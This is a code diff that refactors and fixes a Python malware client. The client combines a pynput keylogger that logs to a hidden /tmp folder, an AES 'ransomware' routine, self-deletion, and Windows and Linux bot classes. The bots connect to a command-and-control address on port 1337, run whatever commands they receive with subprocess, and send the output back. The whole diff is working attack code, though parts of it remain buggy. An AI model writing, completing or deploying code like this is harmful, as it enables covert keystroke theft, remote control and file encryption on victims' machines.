@@ -16,18 +16,20 @@ try:
 	from pynput import keyboard # Import keyboard to perform keylogger operations.
 	from threading import Timer # Import Timer to create thread that'll run every 20s.
 	from Crypto.Cipher import AES # Use AES encryption to encrypt stuff.
-except ImportError:
-    exit(1)
+except ImportError as e:
+    print(f"Import error: {e}")
     
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
+
 #  CONSTANTS  #
 FILENAME = __file__[2:]
 IP = "172.17.0.1" # IP address to connect to.
 PORT = 1337 # Port number to create socket with.
 DIRECTORY = "/tmp/.folder" # Hidden folder to create for our keylogger.
 KEY = "Where's the money?" # Encryption key... :)
-
-global log
+SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to file.
+BLOCK_CIPHER_STRING = "You have been pawned!" # The string to use in cipher block encryption.
+LOG = '' # Will store the keystrokes of the user.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -40,12 +42,12 @@ def create_client_socket():
 		Returns:
 			This function will return a socket object.
 	"""
-	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock: # Initializing socket.
-		ip_port = (IP, PORT) # Tuple containing IP address and port number.
-		client_sock.connect(ip_port) # Connecting to server.
-		initial_message = "OS=" + system() # Send IP address and OS information.
-		client_sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
-		return client_sock # Return the created client socket.
+	client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Initializing socket.
+	ip_port = (IP, PORT) # Tuple containing IP address and port number.
+	client_sock.connect(ip_port) # Connecting to server.
+	initial_message = system() # Send IP address and OS information.
+	client_sock.send(bytes(initial_message, 'utf-8')) # Send message with this host's IP back to the server.
+	return client_sock # Return the created client socket.
 		
 def self_delete(name: str):
 	"""This function will be invoked when the C&C server enter's the
@@ -82,24 +84,23 @@ def on_press(key):
 	"""
 	"""
 	try:
-		self.log += str(key.char)
+		LOG += str(key.char)
 	except AttributeError:
 		if key == key.space:
-			self.log += ' '
-		elif key == key.enter: self.log += '\n'
-		elif key == key.backspace: self.log += ''
-		elif key == key.ctrl: self.log += ' ctrl+'
-		elif key == key.tab: self.log += '\t'
+			LOG += ' '
+		elif key == key.enter: LOG += '\n'
+		elif key == key.backspace: LOG += ''
+		elif key == key.ctrl: LOG += ' ctrl+'
+		elif key == key.tab: LOG += '\t'
 		else:
-			self.log += str(key)
+			LOG += str(key)
 
 def log_to_file():
 	"""
 	"""
-	global log
 	f = open(DIRECTORY + 'log.txt', 'a+')
-	f.write(log)
-	cycle = Timer(30, log_to_file)
+	f.write(LOG)
+	cycle = Timer(SECONDS_TO_LOG, log_to_file)
 	cycle.start()
 
 def keylogger():
@@ -126,7 +127,7 @@ def encrypt_it(data: str):
 		Returns:
 			Will return the encrypted form of the files contents.
 	"""
-	AES_obj = AES.new(KEY, AES.MODE_CBC, "You have been pawned.")
+	AES_obj = AES.new(KEY, AES.MODE_CBC, BLOCK_CIPHER_STRING)
 	return AES_obj.encrypt(data)
 
 def decrypt_it(data: str):
@@ -136,7 +137,7 @@ def decrypt_it(data: str):
 		Returns:
 			Will return the decrypted form of the files contents.
 	"""
-	AES_obj = AES.new(KEY, data, AES.MODE_CBC, "You have been pawned.")
+	AES_obj = AES.new(KEY, data, AES.MODE_CBC, BLOCK_CIPHER_STRING)
 	return AES_obj.decrypt(data)
 
 def ransomware(*request: str):
@@ -167,7 +168,7 @@ class WindowsBot:
 	def __init__(self):
 		pass
 
-	def exec_windows_cmd(self, commnd: str):
+	def exec_windows_cmd(self, command: str):
 		"""This function will execute Windows commands requested by the C&C.
 			Argments:
 				command (str): The command that will be executed on the victim's machine.
@@ -175,9 +176,9 @@ class WindowsBot:
 				Will return the output of the command that was executed.
 		"""
 		DEVNULL = open(devnull, 'w') # Open devnull file to send stderr to.
-		output = subprocess.run(cmd.split(), # Run command.
-								stdout=PIPE, # Pipe command to store in variable.
-								stderr=DEVNULL)	# Send standard error to devnull.
+		output = run(command.split(), # Run command.
+					stdout=PIPE, # Pipe command to store in variable.
+					stderr=DEVNULL)	# Send standard error to devnull.
 		return output
 
 	def handle_request(self):
@@ -188,10 +189,13 @@ class WindowsBot:
 				None
 		"""
 		sock = create_client_socket() # Store socket object.
-		command = sock.recv(1024).decode('utf-8') # Receive command from server.
-		while command != 'quit': # Check if the user has asked to quit the program.
-			command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
-			sock.send(command_output) # Send the output to the C&C server.
+		with sock:
+			command = sock.recv(1024).decode('utf-8') # Receive command from server.
+			while command != '':
+				command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
+				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
+			else:
+				exit(1)
 		
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -202,7 +206,7 @@ class LinuxBot:
 	def __init__(self):
 	    pass
 
-	def exec_linux_cmd(self, commnd: str):
+	def exec_linux_cmd(self, command: str):
 		"""This function will execute Linux commands requested by the C&C.
 			Argments:
 				command (str): The command that will be executed on the victim's machine.
@@ -210,11 +214,11 @@ class LinuxBot:
 				Will return the output of the command that was executed.
 		"""
 		DEVNULL = open(devnull, 'w') # Open devnull file to send stderr to.
-		output = subprocess.run(cmd.split(), # Run command.
-								stdout=PIPE, # Pipe command to store in variable.
-								stderr=DEVNULL)	# Send standard error to devnull.
+		output = run(command.split(), # Run command.
+					stdout=PIPE, # Pipe command to store in variable.
+					stderr=DEVNULL)	# Send standard error to devnull.
 
-		return output
+		return output.stdout
 
 	def handle_request(self):
 		"""This function will handle all tasks related to request made by the server.
@@ -224,9 +228,13 @@ class LinuxBot:
 				None
 		"""
 		sock = create_client_socket() # Store socket object.
-		command = sock.recv(1024).decode('utf-8') # Receive command from server.
-		command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
-		sock.send(command_output) # Send the output to the C&C server.
+		with sock:
+			command = sock.recv(1024).decode('utf-8') # Receive command from server.
+			while command != '':
+				command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
+				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
+			else:
+				exit(1)
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
